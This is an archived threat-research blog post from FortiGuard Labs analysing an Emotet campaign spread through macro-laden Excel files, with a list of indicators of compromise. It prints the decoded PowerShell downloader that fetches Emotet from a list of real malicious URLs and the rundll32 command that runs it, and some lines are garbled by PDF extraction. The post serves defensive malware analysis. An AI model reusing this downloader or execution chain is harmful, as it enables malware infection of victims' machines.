{
    "id": "a4ba3bf7-d496-4500-b582-38edb7623345",
    "created_at": "2023-01-12T14:58:50.203823Z",
    "updated_at": "2025-03-27T02:06:00.091436Z",
    "deleted_at": null,
    "sha1_hash": "9e4839ce4a49c20fd838aa213f798fc195faa285",
    "title": "2022-03-07 - MS Office Files Involved Again in Recent Emotet Trojan Campaign – Part I",
    "authors": "",
    "file_creation_date": "2022-05-29T10:47:00Z",
    "file_modification_date": "2022-05-29T10:47:00Z",
    "file_size": 302030,
    "plain_text": "# MS Office Files Involved Again in Recent Emotet Trojan Campaign – Part I\n\n**[fortinet.com/blog/threat-research/ms-office-files-involved-in-emotet-trojan-campaign-pt-one](https://www.fortinet.com/blog/threat-research/ms-office-files-involved-in-emotet-trojan-campaign-pt-one)**\n\nMarch 7, 2022\n\nRecently, Fortinet’s FortiGuard Labs captured more than 500 Microsoft Excel files that were involved in a campaign to deliver a fresh Emotet\nTrojan onto the victim’s device.\n\nEmotet, known as a modular Trojan, was first discovered in the middle of 2014. Since then, it has become very active, continually updating\nitself. It has also been highlighted in cybersecurity news from time to time. Emotet uses social engineering, like email, to lure recipients into\nopening attached document files (including Word, Excel, PDF, etc.) or clicking links within the content of the email that download Emotet’s\nlatest variant onto the victim’s device and then execute it.\n\n[Our FortiGuard Labs team has monitored Emotet Trojan campaigns in the past and posted numerous technical analysis blogs.](https://www.fortinet.com/blog/search?q=Emotet)\n\nThis time, I grabbed an Excel file from the captured samples and conducted deep research on this campaign. In this part I of my analysis, you\ncan expect to learn: how an Excel file is leveraged to spread Emotet, what anti-analysis techniques Emotet uses in this variant, how it\nmaintains persistence on a victim’s device, how this Emotet variant communicates with its C2 server, and how other modules are delivered,\nloaded, and executed on a victim’s system.\n\n**Affected platforms: Microsoft Windows**\n\n**Impacted parties: 64-bit Windows Users**\n\n**Impact: Controls victim’s device and collects sensitive information**\n\n**Severity level: Critical**\n\n## Looking into the Excel File\n\nFigure 1.1 – The Excel file is opened in the MS Excel program\n\n\n-----\n\na e set y ce s ac o opt o to sab e a ac os t ot cat o ac o Sett gs at s y t s o s t e ye o Secu ty\nWarning” bar when an opened Excel file contains a Macro, as shown in Figure 1.1. This image shows the fake message used to lure a victim\ninto clicking the “Enable Content” button to view the protected content of the Excel file.\n\nThe malicious Macro has a function called “Workbook_Open()” that is executed automatically in the background when the Excel file opens. It\ncalls other local functions to write data to two files: \"uidpjewl.bat\" and \"tjspowj.vbs\" in the “C:\\ProgramData\\” folder. The written data is read out\nfrom multiple cells of this Excel file. In the end, the Macro executes the \"tjspowj.vbs\" file with “wscript.exe.” Refer to Figure 1.2 for more\ninformation.\n\nFigure 1.2 – VBA code in Macro used to execute the extracted \"tjspowj.vbs\" file\n\n## VBS and PowerShell\n\nThe code in “tjspowj.vbs” is obfuscated. See Figure 2.1. The top part is the original code and the bottom part is the normalized code.\n\nFigure 2.1 – VBS code in “tjspowj.vbs”\n\nThe code is very simple. It runs the early extracted “uidpjewl.bat” file, which downloads the Emotet payload file. “uidpjewl.bat” file is a DOS\nbatch file containing the PowerShell code, which is encoded many times. To better understand its intention, I have decoded it below:\n\n_$MJXdfshDrfGZses4=\"hxxps://youlanda[.]org/eln-images/n8DPZISf/,hxxp://rosevideo[.]net/eln-images/EjdCoMlY8Gy/,hxxp://vbaint[.]com/eln-_\n_images/H2pPGte8XzENC/,hxxps://framemakers[.]us/eln-_\n_images/U5W2IGE9m8i9h9r/,hxxp://niplaw[.]com/asolidfoundation/yCE9/,http://robertmchilespe[.]com/cgi/3f/,http://vocoptions[.]net/cgi/ifM9R5ylbVp_\n_fonts/JO5/,http://robertflood[.]us/eln-_\n_images/DGI2YOkSc99XPO/,http://mpmcomputing[.]com/fonts/fJJrjqpIY3Bt3Q/,http://dadsgetinthegame[.]com/eln-_\n_images/tAAUG/,http://smbservices[.]net/cgi/JO01ckuwd/,http://stkpointers[.]com/eln-_\n_images/D/,hxxp://rosewoodcraft[.]com/Merchant2/5.00/PGqX/\".sPLIt(\",\");_\n\n_foReACh($yIdsRhye34syufgxjcdf iN $MJXdfshDrfGZses4){_\n\n_$GweYH57sedswd=(\"c:\\programdata\\puihoud.dll\");_\n\n_invoke-webrequest -uri $yIdsRhye34syufgxjcdf -outfile $GweYH57sedswd;_\n\n_iF(test-path $GweYH57sedswd) {_\n\n_if((get-item $GweYH57sedswd).length -ge 47436) { break; }_\n\n_}_\n_}_\n\nIt tries to download Emotet (into a local file, \"c:\\programdata\\puihoud.dll\", that is hardcoded in the PowerShell) from a group of websites until\nany download is successfully completed.\n\nMeanwhile, the caller “tjspowj.vbs” file takes responsibility for running the downloaded Emotet with the command \"cmd /c start /B\n_c:\\windows\\syswow64\\rundll32.exe c:\\programdata\\puihoud.dll,tjpleowdsyf\"._\n\n“C:\\Windows\\SysWOW64\\” is a system folder created by Microsoft for storing 32-bit files. “WOW64” is the x86 emulator that allows 32-bit\nWindows applications to run on 64-bit Windows. It only exists in 64-bit architecture Windows. In other words, although the downloaded Emotet\nfile was compiled for 32-bit architecture, this variant only affects 64-bit Windows users. It terminates execution and pops up an error message\nwhen it runs on a 32-bit Windows because the file is not found.\n\n“rundll32.exe” is a system file that loads and runs 32-bit dynamic-link library (DLL) files. It uses the command line syntax “rundll32.exe\nDLLname,<Export Function>”, where the “Export Function” is optional. “puihoud.dll” is the DLL name for this Emotet and the subsequent\nexport function name (“tjpleowdsyf”) is a random string. In an analysis tool, I found it only has one export function, called “DllRegisterServer()”.\nLet’s see what happens with a random export function.\n\n## Start Emotet in Rundll32\n\nOnce the Emotet file (“puihoud.dll”) is loaded by “rundll32.exe”, its entry point function is called the very first time. It then calls the DllMain()\nfunction where it loads and decrypts a 32-bit Dll into its memory from a “Resource” named “HITS”. The decrypted Dll is the core of this Emotet,\nwhich will be referred to as “X.dll” in this analysis due to a hardcoded constant string in its code, as shown below.\n\n10024030 ; Export Ordinals Table for X.dll\n\n10024032 aX_dll     db 'X.dll',0\n\n10024038 aDllregisterser db 'DllRegisterServer',0\n\nFigure 3.1 – Decrypt function and the decrypted X.dll\n\nFigure 3.1 shows the relevant functions used to decrypt and deploy the decrypted “X.dll”, which is in memory. The EntryPoint() function of\n“X.dll” is called after its deployment.\n\n\n-----\n\nd c ec s t e e po t u ct o a e o t e co a d e pa a ete s eg ste Se e ot, t u s t e co a d e aga t\n“DllRegisterServer” instead of the random string, like \"C:\\Windows\\system32\\rundll32.exe c:\\programdata\\puihoud.dll,DllRegisterServer\" (see\nstep 1 & 2 in Figure 3.3). It then calls ExitProcess() to exit the first “rundll32.exe”. In Figure 3.2 it is about to call the API CreateProcessW() to\nrun the new command.\n\nFigure 3.2 – “X.dll” starts “puihoud.dll” with “DllRegisterServer”\n\nFigure 3.3 – Work flow of Emotet to reach its core code\n\nWhen Emotet is running with the “DllRegisterServer” export function, it will normally exit from X.dll’s EntryPoint() as well as puihoud.dll’s\nEntryPoint() (step 3 in Figure 3.3). Next, rundll32 calls the API GetProcAddress() to gather the export function “DllRegisterServer” from\n“puihoud.dll” and call it. Finally, puihoud.dll!DllRegisterServer calls X.dll! DllRegisterServer() (step 4 in Figure 3.3).\n\nThis is also pretty much the way rundll32.exe loads and runs a dll file with an export function.\n\nX.dll!DllRegisterServer() is the real starting point for executing malicious things on the victim’s device.\n\n## Anti-Analysis Techniques\n\nTo protect its code from being analyzed, Emotet uses anti-analysis techniques. In this section I will explain what kinds of such techniques this\nvariant uses.\n\n**Code Flow is Obfuscated**\n\nIn most functions, it mixes the code flow with lots of “goto” statements. It has a local variable, called “switch_number” by me, that holds a\ndynamic number to control how it executes the code.\n\nThe logic is that all codes are enclosed in a “while infinite loop” statement, which determines which code flow to enter (“goto”) according to the\nvalue of “switch_number”. And “switch_number” is modified each time after being used, then once the code branch task is finished it goes back\nto the “while” statement to check the “switch_number” again.\n\nThis technique really causes trouble for security researchers trying to analyze the function’s intention and trace its code. Figure 4.1 is a pseudo\ncode in C that reveals the obfuscated code flow.\n\nFigure 4.1 – Pseudo code of obfuscated code flow\n\n**Strings are Encrypted**\n\nAll constant strings are encrypted and are only decrypted just before being used. The constant strings are usually very useful hints for\nresearchers to quickly locate the key point of the malware.\n\n**Constant Numbers are Obfuscated**\n\nNormally, the constant numbers are useful to researchers for guessing the code’s purpose. Here is an example. The instruction “mov\n\n[esp+2ACh+var_1A0], 2710h” has been obfuscated, as seen in the three instructions below.\n\nmov   [esp+2ACh+var_1A0], 387854h\n\nor   [esp+2ACh+var_1A0], 0F1FDFF8Dh\n\nxor   [esp+2ACh+var_1A0], 0F1FDD8CDh\n\n**All APIs are hidden**\n\nThe APIs are obtained using a hash code of both the API name and the module name that the function belongs to. Each time Emotet needs to\ncall an API, it calls a local function to obtain it in the EAX register and then calls it. Figure 4.2 is an example of calling API\nGetCommandLineW(), where 0xB03E1C69 is the hash code of module “kernel32” and 0x4543B55E is the hash code of “GetCommandLineW”.\n\nFigure 4.2 – Getting the API GetCommandLineW() and invoking it\n\n## Communicating with the C2 Server\n\nOnce Emotet finishes collecting the basic information from the victim’s device, it calls the API BCryptEncrypt() to encrypt the data. Let’s look at\nthe kind of data contained in the collected data, as shown in Figure 5.1.\n\nFigure 5.1 – Collected basic data to encrypt\n\nThe 60H bytes data in memory is the plaintext data to be encrypted. Let me explain what most of the data is.\n\n**0x20, at offset+4, is the size of sha256 hash code followed, which includes the bytes starting from offset+8 to offset+0x27 (A0 C9 … 68 F8).**\nTh t i h 256 h h d f th ti f ll i d t t ti t ff t+28h\n\n\n-----\n\n**0** **C, at o set** 8, s t e s e o t e o o g data e e t 0 **0 s t e e gt** o t e ct s ( O S C_9C09 59 ), c s a\ncombination of the computer name and the system driver’s volume number. To obtain this information, Emotet calls APIs like\nGetComputerName(), GetWindowsDirectoryW(), and GetVolumeInformationW().\n\nThe following dword 0x29C220DD is a hash code of Emotet Dll’s full path. 0x13465AA is a constant value defined in its code. It may be a\nmalware ID of this Emotet. 0x2710 is another constant value, and I suppose it is a sort of version of this variant. 0x19E7D is a combination of\nthe victim’s system information, including Windows version, architecture, and so on. To get this information it needs to call APIs\nRtlGetVersion() and GetNativeSystemInfo(). 0x01 at offset+50h is a current process ID (rundll32.exe) related value.\n\nThe last data, starting at offset+58h, is meaningless padding (AB AB AB…).\n\nThe encrypted binary data will be converted into base64 string by calling the API CryptBinaryToStringW(). The base64 string is submitted to\nthe C2 server as a “Cookies” value in an HTTP Get request.\n\nFigure 5.2 – Sending encrypted data to C2 server\n\nIn the example shown in Figure 5.2, as you may have noticed, the Cookie name and URL are randomized by Emotet to bypass the\ncybersecurity device’s detection.\n\nIn total, there are 49 C2 servers (IP address and port) hardcoded and encrypted within this variant. Please refer to the “C2 Server List” under\nthe “IOCs” section for all the IP addresses and ports.\n\nThe C2 server detects the submitted data to determine next steps, including replying with Emotet modules and commands for further actions.\n\nThe replied data is encrypted binary data in the HTTP response body. In Figure 5.3, below, the marked box is an example of the data just after\ndecryption.\n\nFigure 5.3 – The decrypted C2 response data\n\nThe decrypted data is 60H long and contains both verification data and control data.\n\n**0x40 at the beginning is the size of the verification data, the signature data (31 1B … 3C 6D), which is a signed hash of the control data. The**\nreceived data must pass verification, otherwise it drops the packet. The control data starts from offset+54H to the end. 0x8 is the size of the\nfollowing data. The control data in this packet is two dword numbers — 0x00.\n\nThe first 0x00 is a flag that can be 0, 1, or 8.\n\nIf the flag is 8, Emotet will uninstall itself from the victim’s device, including removing the auto-run item from system registry, deleting the file(s)\nor folder(s) it created, as well as deleting the Emotet Dll file.\n\nIf the flag is 0 and the second dword is not 0 (it should be the size of the attached module to this packet), it executes the module on the victim’s\ndevice.\n\nIf the flag is 1, it goes to the flag 0’s branch. I’ll explain this part in more detail in the next part of this analysis.\n\n## Relocate and Persistent\n\nOnce Emotet receives a valid response from the C2 server, it relocates the downloaded Emotet dll file from\n“C:\\Windows\\ProgramData\\puihoud.dll” (in my analysis environment) into the “%LocalAppData%” folder. Moreover, to remain in the victim’s\ndevice, Emotet makes itself persistent by adding the relocated file into the auto-run group in the system registry. Emotet is then able to run at\nsystem startup. Figure 6.1 is a screenshot of the Registry Editor displaying the auto-run item in the system registry.\n\nFigure 6.1 – Added auto-run item in the system registry.\n\n## Conclusion\n\nIn this post we have walked through the malicious Macro within a captured Excel file, which downloads Emotet via two extracted files,\n\"uidpjewl.bat\" and \"tjspowj.vbs\".\n\nWe then went through how the downloaded Emotet Dll file is run in a rundll32.exe process as well as how it extracts the Emotet core X.dll from\nits “Resource”.\n\nI also explained what kinds of anti-analysis techniques this Emotet uses to protect its code from being analyzed.\n\nAnd finally, I elaborated on what kind of data Emotet collects from the victim’s system and how the binary data is encrypted and converted into\nbase64 string and finally submitted to its C2 server via an HTTP packet.\n\nIn the next part of this analysis, I will focus on those returned modules from Emotet’s C2 server and how they are executed by Emotet, as well\nas what sensitive data they are able to steal from the victim’s device.\n\n\n-----\n\nease stay tu ed\n\n## Fortinet Protections\n\nFortinet customers are already protected from this malware by FortiGuard’s Web Filtering, AntiVirus, FortiMail, FortiClient, FortiEDR, and CDR\n(content disarm and reconstruction) services, as follows:\n\nThe malicious Macro inside the Excel sample can be disarmed by the FortiGuard CDR (content disarm and reconstruction) service.\n\nAll relevant URLs have been rated as \"Malicious Websites\" by the FortiGuard Web Filtering service.\n\nThe captured Excel sample and the downloaded Emotet dll file are detected as \"VBA/Emotet.2826!tr.dldr \" and \" W32/Emotet.B185!tr\" and\nare blocked by the FortiGuard AntiVirus service.\n\nFortiEDR detects both the Excel file and Emotet dll file as malicious based on its behavior.\n\n[In addition to these protections, we suggest that organizations have their end users also go through the FREE NSE training:](https://training.fortinet.com/?utm_source=blog&utm_campaign=nse-institute) NSE 1 –\nInformation Security Awareness. It includes a module on Internet threats that is designed to help end users learn how to identify and protect\nthemselves from phishing attacks.\n\n## IOCs\n\n**URLs Involved in the Campaign:**\n\n\"hxxps[:]//youlanda[.]org/eln-images/n8DPZISf/\"\n\n\"hxxp[:]//rosevideo[.]net/eln-images/EjdCoMlY8Gy/\"\n\n\"hxxp[:]//vbaint[.]com/eln-images/H2pPGte8XzENC/\"\n\n\"hxxps[:]//framemakers[.]us/eln-images/U5W2IGE9m8i9h9r/\"\n\n\"hxxp[:]//niplaw[.]com/asolidfoundation/yCE9/\"\n\n\"hxxp[:]//robertmchilespe[.]com/cgi/3f/\"\n\n\"hxxp[:]//vocoptions[.]net/cgi/ifM9R5ylbVpM8hfR/\"\n\n\"hxxp[:]//missionnyc[.]org/fonts/JO5/\"\n\"hxxp[:]//robertflood[.]us/eln-images/DGI2YOkSc99XPO/\"\n\n\"hxxp[:]//mpmcomputing[.]com/fonts/fJJrjqpIY3Bt3Q/\"\n\n\"hxxp[:]//dadsgetinthegame[.]com/eln-images/tAAUG/\"\n\n\"hxxp[:]//smbservices[.]net/cgi/JO01ckuwd/\"\n\n\"hxxp[:]//stkpointers[.]com/eln-images/D/\"\n\n\"hxxp[:]//rosewoodcraft[.]com/Merchant2/5[.]00/PGqX/\"\n\n**C2 Server List in this Variant: (49 in total)**\n\n185[.]248[.]140[.]40:443\n\n8[.]9 [.]11 [.]48:443\n\n200[.]17 [.]134 [.]35:7080\n\n207[.]38 [.]84 [.]195:8080\n\n79[.]172 [.]212 [.]216:8080\n\n45[.]176 [.]232 [.]124:443\n\n45[.]118 [.]135 [.]203:7080\n\n162[.]243 [.]175 [.]63:443\n\n110[.]232[.]117[.]186:8080\n\n103[.]75[.]201[.]4:443\n\n195[.]154[.]133[.]20:443\n\n160[.]16[.]102[.]168:80\n\n164[.]68[.]99[.]3:8080\n\n131[.]100[.]24[.]231:80\n\n216[.]158[.]226[.]206:443\n\n159[.]89[.]230[.]105:443\n\n178[.]79[.]147[.]66:8080\n\n178[.]128[.]83[.]165:80\n\n212[.]237[.]5[.]209:443\n\n82[.]165[.]152[.]127:8080\n\n50[.]116[.]54[.]215:443\n\n58[.]227[.]42[.]236:80\n\n119[.]235[.]255[.]201:8080\n\n144[.]76[.]186[.]49:8080\n\n138[.]185[.]72[.]26:8080\n\n\n-----\n\n6 [ ] [ ]50[ ]39 080\n81[.]0[.]236[.]90:443\n176[.]104[.]106[.]96:8080\n144[.]76[.]186[.]55:7080\n129[.]232[.]188[.]93:443\n212[.]24[.]98[.]99:8080\n203[.]114[.]109[.]124:443\n103[.]75[.]201[.]2:443\n173[.]212[.]193[.]249:8080\n41[.]76[.]108[.]46:8080\n45[.]118[.]115[.]99:8080\n158[.]69[.]222[.]101:443\n107[.]182[.]225[.]142:8080\n212[.]237[.]17[.]99:8080\n212[.]237[.]56[.]116:7080\n159[.]8[.]59[.]82:8080\n46[.]55[.]222[.]11:443\n104[.]251[.]214[.]46:8080\n31[.]24[.]158[.]56:8080\n153[.]126[.]203[.]229:8080\n51[.]254[.]140[.]238:7080\n185[.]157[.]82[.]211:8080\n217[.]182[.]143[.]207:443\n45[.]142[.]114[.]231:8080\n\n**Sample SHA-256 Involved in the Campaign:**\n\n[Excel files Captured]\n\n25271BB2C848A32229EE7D39162E32F5F74580E43F5E24A93E6057F7D15524F0\n\nC176C2B0336EA70C0D875F5C79D00771D59891560283364A81B2EDE495CDE62F\n\n9C62600A0885E39BD39748150B9B64155C9EA2DBBCDD43241EB24C8E098DE782\n\n36C2119C68B3C79B58417CADEA3547F8BBECD2DF02FEB5F04EE798DFA621B66D\n\nB380DFC348541691E4084689405D8ACFAEAFDDD92EFF95566AFF2412F620E2DC\n\n68AA775EC46C8B0911542E471F9A7F39D538001BD8552898416310436F58B95A\n\nB14AB6A611A93B25DA2815D2071AA5B76085414BF6AD32432FC0809B3610DB05\n\n81E9D87903290E4A525BEB865F5CCCCA9838BDD51238DC4FD0B9AE623BF609BB\n\nB019A867D167B6088EA18B3BD2F1A67706505AACC9542C4017E757F0381B3F0A\n\nF4626135C820C4784E1452E81FE25D291EA3A6326E906A2E15AE960EEA3276E4\n\n[puihoud.dll (the downloaded Emotet)]\n\nA7C6ABBC3241B6CFCFA27158E80BD50D3C9F1AE97E86481CCABD5B2337670690\n\n_Learn more about Fortinet’s_ _[FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and](https://www.fortinet.com/fortiguard/labs?utm_source=blog&utm_campaign=fortiguard-labs)_\n_[Services portfolio.](https://www.fortinet.com/fortiguard/labs?tab=security-bundles&utm_source=blog&utm_campaign=security-bundles)_\n\n_Read_ _[part II of our analysis to learn more about malicious modules involved and how to avoid this lure.](https://www.fortinet.com/blog/threat-research/ms-office-files-involved-again-in-recent-emotet-trojan-campaign-part-ii)_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-03-07 - MS Office Files Involved Again in Recent Emotet Trojan Campaign – Part I.pdf"
    ],
    "report_names": [
        "2022-03-07 - MS Office Files Involved Again in Recent Emotet Trojan Campaign – Part I.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535530,
    "ts_updated_at": 1743041160,
    "ts_creation_date": 1653821220,
    "ts_modification_date": 1653821220,
    "files": {
        "pdf": "https://archive.orkl.eu/9e4839ce4a49c20fd838aa213f798fc195faa285.pdf",
        "text": "https://archive.orkl.eu/9e4839ce4a49c20fd838aa213f798fc195faa285.txt",
        "img": "https://archive.orkl.eu/9e4839ce4a49c20fd838aa213f798fc195faa285.jpg"
    }
}